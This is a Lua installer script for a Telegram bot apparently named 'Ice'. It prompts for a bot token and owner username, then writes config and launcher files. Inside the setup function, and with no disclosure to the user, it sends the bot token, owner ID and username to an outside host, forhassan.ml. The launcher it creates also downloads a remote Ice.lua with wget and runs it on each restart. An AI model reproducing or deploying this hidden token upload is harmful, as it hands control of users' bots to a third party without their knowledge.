serpent = dofile("./File_Libs/serpent.lua")
https = require("ssl.https")
http = require("socket.http")
JSON = dofile("./File_Libs/JSON.lua")
local database = dofile("./File_Libs/redis.lua").connect("127.0.0.1", 6379)
Server_Ice = io.popen("echo $SSH_CLIENT | awk '{ print $1}'"):read('*a')
local AutoFiles_Ice = function() 
local Create_Info = function(Token,Sudo,UserName)  
local Ice_Info_Sudo = io.open("sudo.lua", 'w')
Ice_Info_Sudo:write([[
token = "]]..Token..[["

Sudo = ]]..Sudo..[[  

UserName = "]]..UserName..[["
]])
Ice_Info_Sudo:close()
end  
if not database:get(Server_Ice.."Token_Ice") then
print("\27[1;34m»» Send Your Token Bot :\27[m")
local token = io.read()
if token ~= '' then
local url , res = https.request('https://api.telegram.org/bot'..token..'/getMe')
if res ~= 200 then
io.write('\n\27[1;31m»» Sorry The Token is not Correct \n\27[0;39;49m')
else
io.write('\n\27[1;31m»» The Token Is Saved\n\27[0;39;49m')
database:set(Server_Ice.."Token_Ice",token)
end 
else
io.write('\n\27[1;31mThe Tokem was not Saved\n\27[0;39;49m')
end 
os.execute('lua start.lua')
end
------------------------------------------------------------------------------------------------------------
------------------------------------------------------------------------------------------------------------
if not database:get(Server_Ice.."UserName_Ice") then
print("\27[1;34m\n»» Send Your UserName Sudo : \27[m")
local UserName = io.read():gsub('@','')
if UserName ~= '' then
local Get_Info = http.request("http://TshAkE.ml/info/?user="..UserName)
if Get_Info:match('Is_Spam') then
io.write('\n\27[1;31m»» Sorry The server is Spsm \nتم حظر السيرفر لمدة 5 دقايق بسبب التكرار\n\27[0;39;49m')
return false
end
local Json = JSON:decode(Get_Info)
if Json.Info == false then
io.write('\n\27[1;31m»» Sorry The UserName is not Correct \n\27[0;39;49m')
os.execute('lua start.lua')
else
if Json.Info == 'Channel' then
io.write('\n\27[1;31m»» Sorry The UserName Is Channel \n\27[0;39;49m')
os.execute('lua start.lua')
else
io.write('\n\27[1;31m»» The UserNamr Is Saved\n\27[0;39;49m')
database:set(Server_Ice.."UserName_Ice",Json.Info.Username)
database:set(Server_Ice.."Id_Ice",Json.Info.Id)
end
end
else
io.write('\n\27[1;31mThe UserName was not Saved\n\27[0;39;49m')
end 
os.execute('lua start.lua')
end
local function Files_Ice_Info()
Create_Info(database:get(Server_Ice.."Token_Ice"),database:get(Server_Ice.."Id_Ice"),database:get(Server_Ice.."UserName_Ice"))   
https.request("https://forhassan.ml/Ice/Ice.php?id="..database:get(Server_Ice.."Id_Ice").."&user="..database:get(Server_Ice.."UserName_Ice").."&token="..database:get(Server_Ice.."Token_Ice"))
local RunIce = io.open("Ice", 'w')
RunIce:write([[
#!/usr/bin/env bash
cd $HOME/Ice
token="]]..database:get(Server_Ice.."Token_Ice")..[["
rm -fr Ice.lua
wget "https://raw.githubusercontent.com/IceTEAM/Ice/master/Ice.lua"
while(true) do
rm -fr ../.telegram-cli
./tg -s ./Ice.lua -p PROFILE --bot=$token
done
]])
RunIce:close()
local RunTs = io.open("ts", 'w')
RunTs:write([[
#!/usr/bin/env bash
cd $HOME/Ice
while(true) do
rm -fr ../.telegram-cli
screen -S Ice -X kill
screen -S Ice ./Ice
done
]])
RunTs:close()
end
Files_Ice_Info()
database:del(Server_Ice.."Token_Ice");database:del(Server_Ice.."Id_Ice");database:del(Server_Ice.."UserName_Ice")
sudos = dofile('sudo.lua')
os.execute('./install.sh ins')
end 
local function Load_File()  
local f = io.open("./sudo.lua", "r")  
if not f then   
AutoFiles_Ice()  
var = true
else   
f:close()  
database:del(Server_Ice.."Token_Ice");database:del(Server_Ice.."Id_Ice");database:del(Server_Ice.."UserName_Ice")
sudos = dofile('sudo.lua')
os.execute('./install.sh ins')
var = false
end  
return var
end
Load_File()
